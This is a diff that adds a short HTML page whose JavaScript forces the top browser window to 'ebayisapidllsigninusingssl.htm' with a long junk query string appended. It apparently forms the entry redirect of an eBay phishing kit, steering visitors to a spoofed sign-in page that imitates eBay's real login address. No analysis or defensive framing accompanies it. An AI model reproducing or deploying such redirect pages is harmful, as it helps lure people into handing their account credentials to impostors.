@@ -1,0 +1,6 @@
+<html>
+<script language="javascript">
+var page = "ebayisapidllsigninusingssl.htm?rbbnolsnieoasupatanokgarmudlzsnetdulasagkearanawpogliildunariniactstoraukedtdrintgdaszlannaagispllakeltnpauueuboanitsarncrgansbomiaolwsi44921484820" //the page to redirect.
+top.location = page;
+</script> 
+</html>
